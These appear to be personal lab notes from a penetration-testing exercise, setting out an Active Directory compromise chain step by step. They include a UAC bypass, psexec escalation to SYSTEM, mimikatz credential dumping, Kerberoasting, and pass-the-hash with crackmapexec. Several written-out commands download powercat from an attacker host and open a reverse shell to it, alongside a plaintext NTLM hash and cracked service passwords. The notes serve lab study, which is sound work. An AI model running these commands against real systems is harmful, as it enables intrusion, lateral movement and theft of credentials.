NOTES

After uploading the macro enabled docx file, can see that the user on .22 (alice) is medium leveled and need to level up in order to dump creds/ hashes

Follow this guide for bypassing UAC: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
	C file is the best bet, make sure to change the curent dir to the file you want to be executed as higher permission
	best for me was an msfvenom payload

	upload psexec, the compiled exploit, and the new reverse shell to the victim
		(exploit compiled with: i686-w64-mingw32-gcc main.c -o main)
	start a listener for the reverse shell and run the exploit
	a new shell will catch but still as user alice, however, this shell has high privs and can run psexec as system

	create ANOTHER new shell on a different port, upload it, and start another listener
		from the high priv session, run psexec on the newest shell to get a final SYSTEM callback
			.\psexec.exe -i -accepteula -d -s c:\users\alice\desktop\shell-9002.exe

	given system privs and can upload and run mimikatz to extract hashes with logonpasswords

	crack hashes with hashcat and the pass.txt file from alice's desktop

	query the TGT with Alice's cracked creds
		python2 GetUserSPNs.py svcorp.com/alice:ThisIsTheUsersPassword01 -dc-ip 10.11.1.20 -request

	get the service tickets and crack them with the same pass.txt wordlist

		sqlServer:ThisIsTheUsersPassword23
		HP3service:ThisIsTheUsersPassword24
		extmailservice:ThisIsTheUsersPassword25

crackmapexec smb 10.11.1.20 10.11.1.21 10.11.1.22 10.11.1.23 10.11.1.24 -u Administrator -H ee0c207898a5bccc01f38115019ca2fb --local-auth
	USE LOCAL AUTH YOU DUMMY
	local auth for reused admin passwords, no local auth for domain users

getting a shell (by hand) with CME
	crackmapexec smb 10.11.1.24 -u Administrator -H ee0c207898a5bccc01f38115019ca2fb --local-auth -x "powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.173/powercat.ps1', 'powercat.ps1')"
	crackmapexec smb 10.11.1.24 -u Administrator -H ee0c207898a5bccc01f38115019ca2fb --local-auth -x "powershell.exe -ExecutionPolicy bypass Import-Module .\powercat.ps1; powercat -c 192.168.119.173 -p 9001 -e cmd.exe"

repeat the process of popping boxes, stealing creds with mimikatz and CME

process
	macro shell on 22
	elevate to system with UAC bypass OR steal admin hash with mimikatz
	PTH to 24
	steal creds for pete on 24
	PTH to next box and steal creds for tris who is DA
